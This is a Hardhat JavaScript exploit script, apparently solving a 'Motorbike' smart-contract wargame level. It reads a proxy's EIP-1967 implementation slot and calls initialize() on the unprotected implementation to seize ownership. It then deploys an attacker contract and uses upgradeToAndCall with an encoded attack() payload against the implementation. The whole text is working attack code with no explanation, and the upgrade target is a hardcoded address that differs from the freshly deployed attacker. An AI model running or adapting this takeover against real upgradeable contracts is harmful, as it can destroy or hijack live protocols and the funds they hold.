import { ethers } from "hardhat";

async function main() {
  const contract = { address: "0x18C3ecc88F5d3dE43266FaCc2B49DAcF6D6BAa52" };

  const _IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  const implementation = {
    address: "0x" + (await ethers.provider.getStorageAt(contract.address,_IMPLEMENTATION_SLOT)).slice(26)
  };

  const engineImpl = await ethers.getContractAt("Engine", implementation.address);
  let tx = await engineImpl.initialize();
  await tx.wait(3);
  console.log("implementation contract initialized");

  const Attacker = await ethers.getContractFactory("MotorbikeAttacker");
  const attacker = await Attacker.deploy();
  console.log("attacker deployed at", attacker.address);

  const iface = new ethers.utils.Interface(["function attack()"]);
  const payload = iface.encodeFunctionData("attack");

  tx = await engineImpl.upgradeToAndCall("0x96E7390C67F7134E8041B83cD6c46D5f3967503e", payload);
  await tx.wait(1);
  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
